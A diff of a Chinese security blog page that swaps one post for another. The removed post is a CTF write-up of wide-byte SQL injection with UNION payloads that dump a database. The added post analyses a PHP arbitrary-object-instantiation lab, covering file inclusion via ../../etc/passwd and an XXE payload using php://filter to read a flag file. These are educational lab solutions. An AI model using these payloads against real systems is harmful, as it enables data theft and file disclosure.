@@ -15,32 +15,23 @@
 
 
 
-<meta name="description" content="今天做了ISCC2018的CTF，里面有一道宽字节注入的题，讲一下解题思路。">
-<meta name="keywords" content="CTF-WriteUp">
+<meta name="description" content="前言 PHP-Audit-Labs-Day3-实例化任意对象漏洞，学习一下。">
+<meta name="keywords" content="代码审计,PHP">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ISCC-2018 web题&quot;SQL注入的艺术&quot; write up">
-<meta property="og:url" content="http://yoursite.com/2018/05/01/ISCC-2018-web6/index.html">
+<meta property="og:title" content="PHP代码审计-实例化任意对象漏洞">
+<meta property="og:url" content="http://yoursite.com/2018/09/24/PHP-Audit-Labs-Day3/index.html">
 <meta property="og:site_name" content="Double--R blog">
-<meta property="og:description" content="今天做了ISCC2018的CTF，里面有一道宽字节注入的题，讲一下解题思路。">
+<meta property="og:description" content="前言 PHP-Audit-Labs-Day3-实例化任意对象漏洞，学习一下。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/blog/18.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/1.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/2.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/3.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/4.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/5.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/6.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/7.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/8.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/9.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/10.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/11.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/12.jpg">
-<meta property="og:updated_time" content="2018-07-23T01:37:21.042Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/BLOG/25.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/PHP-Audit-Labs/Day3/1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/PHP-Audit-Labs/Day3/2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/PHP-Audit-Labs/Day3/3.png">
+<meta property="og:updated_time" content="2018-09-25T15:18:12.706Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="ISCC-2018 web题&quot;SQL注入的艺术&quot; write up">
-<meta name="twitter:description" content="今天做了ISCC2018的CTF，里面有一道宽字节注入的题，讲一下解题思路。">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/blog/18.jpg">
+<meta name="twitter:title" content="PHP代码审计-实例化任意对象漏洞">
+<meta name="twitter:description" content="前言 PHP-Audit-Labs-Day3-实例化任意对象漏洞，学习一下。">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/BLOG/25.jpg">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -72,7 +63,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>ISCC-2018 web题&#34;SQL注入的艺术&#34; write up | Double--R blog</title>
+<title>PHP代码审计-实例化任意对象漏洞 | Double--R blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -318,11 +309,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-ISCC-2018-web6" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-PHP-Audit-Labs-Day3" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2018/05/01/ISCC-2018-web6/" class="article-date">
-      <time datetime="2018-05-01T11:33:08.000Z" itemprop="datePublished">2018-05-01</time>
+      <a href="/2018/09/24/PHP-Audit-Labs-Day3/" class="article-date">
+      <time datetime="2018-09-24T11:47:16.000Z" itemprop="datePublished">2018-09-24</time>
 </a>
 
 
@@ -337,7 +328,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      ISCC-2018 web题&#34;SQL注入的艺术&#34; write up
+      PHP代码审计-实例化任意对象漏洞
     </h1>
   
 
@@ -346,7 +337,7 @@
 		<span class="post-meta-item-icon">
 			<i class="fa fa-keyboard-o"></i>
 			<span class="post-meta-item-text"> 字数统计: </span>
-			<span class="post-count">715字</span>
+			<span class="post-count">848字</span>
 		</span>
 	</span>
 	
@@ -355,7 +346,7 @@
 		<span class="post-meta-item-icon">
 			<i class="fa fa-hourglass-half"></i>
 			<span class="post-meta-item-text"> 阅读时长: </span>
-			<span class="post-count">3分</span>
+			<span class="post-count">4分</span>
 		</span>
 	</span>
 </div>
@@ -368,7 +359,7 @@
 
         
     <div class="article-tag tagcloud" style="margin-top:30px;">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF-WriteUp/">CTF-WriteUp</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/">PHP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -378,63 +369,44 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p><strong>今天做了ISCC2018的CTF，里面有一道宽字节注入的题，讲一下解题思路。</strong></p>
+        <p><strong>前言</strong></p>
+<p>PHP-Audit-Labs-Day3-实例化任意对象漏洞，学习一下。</p>
 <hr>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/blog/18.jpg" alt="Alt text"></p>
+<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/BLOG/25.jpg" alt=""></p>
 <a id="more"></a>
-<h4 id="第一步：看题"><a href="#第一步：看题" class="headerlink" title="第一步：看题"></a>第一步：看题</h4><ul>
-<li>进去以后有两个界面，一个首页，一个个人信息界面：</li>
-</ul>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/1.jpg" alt="Alt text"></p>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/2.jpg" alt="Alt text"></p>
-<ul>
-<li>在个人信息界面看到?id=1，疑似注入点，单引号闭合一下，没有成功，单引号疑似被转义。极大可能是宽字节注入。</li>
-</ul>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/3.jpg" alt="Alt text"></p>
-<h4 id="讲一下宽字节注入"><a href="#讲一下宽字节注入" class="headerlink" title="讲一下宽字节注入"></a>讲一下宽字节注入</h4><ul>
-<li><p><a href="https://www.cnblogs.com/lcamry/articles/5625276.html" target="_blank" rel="noopener">sql宽字节注入详解</a></p>
-<p>   gbk编码中汉字占两个字节，mysql在使用gbk编码时会认为两个字符是一个汉字（前一个的ascii码值要大于128，才到汉字范围）。当单引号被转义后’就变成了\’,如果我们把单引号改成%df’，转义后就是%df\’,\的ascii码值是5c，gbk编码认为%df%5c是一个汉字，所以单引号逃出转义，我们就能闭合查询语句。注意：虽然gb2312也是宽字节中的一员，但gb2312编码的取值范围高位为0xA1~0xF7，低位为0xA~0xFE,\号不再范围中，所以无法被编码。</p>
-</li>
-</ul>
-<h4 id="尝试宽字节注入"><a href="#尝试宽字节注入" class="headerlink" title="尝试宽字节注入"></a>尝试宽字节注入</h4><ul>
-<li>构造payload：1 %df’ and 1=1 %23 和 1 %df’ and 1=2 %23看能否宽字节注入。</li>
-</ul>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/4.jpg" alt="Alt text"></p>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/5.jpg" alt="Alt text"></p>
-<ul>
-<li>1=1逻辑成立，查询成功，有显示内容。1=2逻辑不成立，查询失败，无显示内容。成功将语句插入到查询语句中，宽字节注入可行。</li>
-</ul>
-<h4 id="Order-by-子句猜查询字段数"><a href="#Order-by-子句猜查询字段数" class="headerlink" title="Order by 子句猜查询字段数"></a>Order by 子句猜查询字段数</h4><ul>
-<li>构造payload：1 %df’ order by n %23. n从1开始逐渐变大，当n为8时能正常显示，n为9时无显示。说明查询语句查询了8个字段。</li>
-</ul>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/6.jpg" alt="Alt text"></p>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/7.jpg" alt="Alt text"></p>
-<h4 id="判断查询结果输出的位置"><a href="#判断查询结果输出的位置" class="headerlink" title="判断查询结果输出的位置"></a>判断查询结果输出的位置</h4><ul>
-<li>构造payload：-1 %df’ union select 1,2,3,4,5,6,7,8 %23. 2、7、4位的信息输出。</li>
-</ul>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/8.jpg" alt="ALt text"></p>
-<h4 id="开始获得数据库信息"><a href="#开始获得数据库信息" class="headerlink" title="开始获得数据库信息"></a>开始获得数据库信息</h4><ul>
-<li>构造payload：-1 %df’ union select 1,database(),3,version(),5,6,7,8 %23 查询当前使用数据库名和版本信息。</li>
-</ul>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/9.jpg" alt="ALt text"></p>
-<ul>
-<li>数据库名baji，构造payload：-1 %df’ union select 1,group_concat(table_name),3,4,5,6,7,8 from information_schema.tables where table_schema=0x62616A69 %23，查表名（0x62616A69为数据库名的ascii码值)</li>
-</ul>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/10.jpg" alt="Alt text"></p>
-<ul>
-<li>只有一个admins表，构造payload：-1 %df’ union select 1,group_concat(column_name),3,4,5,6,7,8 from information_schema.columns where table_schema=0x62616A69 %23，查字段名。注：按理来说如果不止一张表要确定具体查询的表，完整的是 where table_schema=baji and table_name=admins，但是它只有一个表，我懒得编码表名了。</li>
-</ul>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/11.jpg" alt="Alt text"></p>
-<ul>
-<li>有个flag的字段名，查一下这个字段下的信息，构造payload：-1 %df’ union select 1,group_concat(flag),3,4,5,6,7,8 from baji.admins %23</li>
-</ul>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/12.jpg" alt="Alt text"></p>
-<ul>
-<li>出flag,提交成功，题目解出。</li>
-</ul>
-<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p><strong>题目与一些盲注比起来还是比较简单的，没有什么过滤，也不用写注入脚本，手注就行了。做下来没有什么地方卡住的。还是要继续努力，下次做出一些难题来。</strong></p>
 <hr>
-<div align="center"><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=487190408&auto=1&height=66"></iframe></div>
+<h2 id="DAY3-Snow-Flake"><a href="#DAY3-Snow-Flake" class="headerlink" title="DAY3-Snow Flake"></a>DAY3-Snow Flake</h2><p>题目叫雪花，代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__autoload</span><span class="params">($className)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">include</span> $className;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$controllerName = $_GET[<span class="string">'c'</span>];</span><br><span class="line">$data = $_GET[<span class="string">'d'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (class_exists($controllerName)) &#123;</span><br><span class="line">    $controller = <span class="keyword">new</span> $controllerName($data);</span><br><span class="line">    $controller-&gt;render();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'There is no page with this name'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HomeController</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $data;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = $data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;data[<span class="string">'new'</span>]) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'controller rendering new response'</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'controller rendering old response'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>漏洞解析：</strong></p>
+<p>这段代码中有两个安全漏洞给。第一个是文件包含漏洞，在代码的第9行中使用了class_exists()函数来判断用户传入的控制器是否存在，class_exists()函数的定义如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bool class_exists ( string $class_name [, bool $autoload = <span class="keyword">TRUE</span> ] )</span><br><span class="line"><span class="comment">//class_exists-Checks if the class has been defined</span></span><br></pre></td></tr></table></figure>
+<p>当class_exists()函数被调用时会触发用户定义的_<em>autoload()方法，用于加载找不到的类。\</em>_autoload()方法的定义如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">void __autoload ( string $class )</span><br><span class="line"><span class="comment">//__autoload-Attempt to load undefined class</span></span><br></pre></td></tr></table></figure>
+<p>除此之外还有很多函数会调用__autoload（）</p>
+<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/PHP-Audit-Labs/Day3/1.png" alt=""></p>
+<p>所以如果我么你输入<code>../../etc/passwd</code>之类的，就会调用class_exists()，这样就会触发__autoload()，攻击者可以使用路径穿越符号来包含任意文件，这样就是一个任意文件包含的漏洞。当然使用路径穿越符号的前提是PHP5~5.3（包含5.3版本）版本之间。</p>
+<p>第二个漏洞是第10行，实例化类的类名和传入类的参数均是可控的，所以攻击者可以通过该漏洞，构造任意函数。即使代码本身不包含易受攻击的构造函数，我们也可以使用SimpleXMLElement来进行XXE攻击，当然这里是一个Blind XXE，所以要通过引用外部实体的方法进行攻击，但我再写.dtd文件时总是有问题，等下次解决了再改。除此之外我们还可以利用这个漏洞进行命令执行（前提是安装了PHP扩展插件expect）。</p>
+<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>下面对与他留下来的题目进行分析。</p>
+<p><strong>题目源码：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// f1agi3hEre.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">"HRCTF&#123;X33_W1tH_S1mpl3Xml3l3m3nt&#125;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>题目分析：</strong></p>
+<p>这道题主要就是之前提到的实例化漏洞和XXE漏洞的结合，他同样使用了class_exists函数来判断类是否存在，但是这里并没有__autoload函数，而是通过spl_autoload_register注册了一个类似__autoload做用的函数，即输出404信息，spl_autoload_register函数的定义如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>所以我们这里需要先用内置类GlobIterator类搜索flag文件的名字，Globlterator类定义如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> GlobIterator::__construct ( string $pattern [, int $flags = FilesystemIterator::KEY_AS_PATHNAME | FilesystemIterator::CURRENT_AS_FILEINFO ] )</span><br><span class="line"><span class="comment">//Iterates through a file system in a similar fashion to glob().</span></span><br></pre></td></tr></table></figure>
+<p>注意它的使用版本是PHP5&gt;=5.3.0,PHP7。所以我们name传入GlobIterator，param传入./*.php，也就是匹配当前目录下所有.php结尾的文件，param2传入0，结果如下：</p>
+<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/PHP-Audit-Labs/Day3/2.png" alt=""></p>
+<p>当我们获得flag文件的文件名时，我们就可以利用XXE漏洞进行文件读取，但要注意如果文件中存在&lt; &gt; &amp; ‘ “这五个符号试，就会导致XML文件解析错误所以我们这里使用php://filter协议，payload如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=SimpleXMLElement&amp;param=&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/var/www/html/CTF/f1agi3hEre.php&quot;&gt;]&gt;&lt;x&gt;%26xxe;&lt;/x&gt;&amp;param2=1</span><br></pre></td></tr></table></figure>
+<p>结果如下：</p>
+<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/PHP-Audit-Labs/Day3/3.png" alt=""></p>
+<p>解码后：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag = &quot;HRCTF&#123;X33_W1tH_S1mpl3Xml3l3m3nt&#125;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<hr>
+<div align="center"><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=465675773&auto=1&height=66"></iframe></div>
+
+
       
     </div>
     
@@ -442,13 +414,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2018/05/01/ISCC-2018-web6/">ISCC-2018 web题&#34;SQL注入的艺术&#34; write up</a></p>
+        <p><span>本文标题:</span><a href="/2018/09/24/PHP-Audit-Labs-Day3/">PHP代码审计-实例化任意对象漏洞</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">Double--R</a></p>
-        <p><span>发布时间:</span>2018-05-01, 19:33:08</p>
-        <p><span>最后更新:</span>2018-07-23, 09:37:21</p>
+        <p><span>发布时间:</span>2018-09-24, 19:47:16</p>
+        <p><span>最后更新:</span>2018-09-25, 23:18:12</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2018/05/01/ISCC-2018-web6/" title="ISCC-2018 web题&#34;SQL注入的艺术&#34; write up">http://yoursite.com/2018/05/01/ISCC-2018-web6/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2018/05/01/ISCC-2018-web6/　　作者: Double--R" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2018/09/24/PHP-Audit-Labs-Day3/" title="PHP代码审计-实例化任意对象漏洞">http://yoursite.com/2018/09/24/PHP-Audit-Labs-Day3/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2018/09/24/PHP-Audit-Labs-Day3/　　作者: Double--R" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -460,16 +432,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2018/05/12/Easy-Unserialize-Writeup/">
-                    php反序列化组会例题和makerctf easy_unserialize的wp
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2018/04/27/BugKu-Login3/">
-                    BugKuCTF-Login3的Write Up
+                <a href="/2018/09/22/异或构造字符串/">
+                    异或构造字符串
                 </a>
             </div>
         
@@ -481,7 +447,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#第一步：看题"><span class="toc-number">1.</span> <span class="toc-text">第一步：看题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#讲一下宽字节注入"><span class="toc-number">2.</span> <span class="toc-text">讲一下宽字节注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#尝试宽字节注入"><span class="toc-number">3.</span> <span class="toc-text">尝试宽字节注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Order-by-子句猜查询字段数"><span class="toc-number">4.</span> <span class="toc-text">Order by 子句猜查询字段数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#判断查询结果输出的位置"><span class="toc-number">5.</span> <span class="toc-text">判断查询结果输出的位置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#开始获得数据库信息"><span class="toc-number">6.</span> <span class="toc-text">开始获得数据库信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#总结"><span class="toc-number">7.</span> <span class="toc-text">总结</span></a></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#DAY3-Snow-Flake"><span class="toc-number">1.</span> <span class="toc-text">DAY3-Snow Flake</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#题目分析"><span class="toc-number">2.</span> <span class="toc-text">题目分析</span></a></li></ol>
         
     </div>
     <style>
@@ -517,7 +483,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"ISCC-2018 web题"SQL注入的艺术" write up　| Double--R blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"PHP代码审计-实例化任意对象漏洞　| Double--R blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -537,15 +503,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2018/05/12/Easy-Unserialize-Writeup/" title="上一篇: php反序列化组会例题和makerctf easy_unserialize的wp">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2018/04/27/BugKu-Login3/" title="下一篇: BugKuCTF-Login3的Write Up">
+            <a href="/2018/09/22/异或构造字符串/" title="下一篇: 异或构造字符串">
                 <i class="fa fa-angle-right"></i>
             </a>
         
